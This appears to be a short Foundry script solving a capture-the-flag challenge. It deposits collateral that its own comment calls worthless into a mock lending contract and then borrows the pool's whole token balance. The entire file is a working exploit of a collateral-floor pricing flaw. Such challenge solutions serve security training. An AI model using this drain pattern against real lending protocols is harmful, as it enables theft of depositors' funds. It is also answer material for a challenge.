// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C1Floor.sol";

/// Deposit the floored (worthless) collateral and borrow the pool dry.
contract SolveC1 is Script {
    function run() external {
        FloorSetup setup = FloorSetup(vm.envAddress("SETUP"));
        MockERC20 collateral = setup.collateral();
        FloorLending lending = setup.lending();
        MockERC20 usdx = setup.usdx();

        vm.startBroadcast();
        collateral.approve(address(lending), type(uint256).max);
        lending.deposit(1_000_000 ether);
        lending.borrow(usdx.balanceOf(address(lending)));
        vm.stopBroadcast();
    }
}
